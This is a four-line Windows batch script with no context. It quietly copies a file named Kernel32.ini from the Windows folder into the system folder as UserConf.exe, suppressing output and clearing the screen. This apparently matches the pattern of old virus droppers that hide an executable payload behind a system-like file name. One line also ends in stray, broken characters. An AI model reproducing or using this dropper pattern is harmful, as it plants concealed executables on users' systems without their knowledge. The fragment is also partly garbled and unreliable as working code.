@echo off
@if exist C:\WINDOWS\SYSTEM\UserConf.exe goto it_exists
@copy C:\WINDOWS\Kernel32.ini C:\WINDOWS\SYSTEM\UserConf.exe > NUL; "
:it_exists
cls
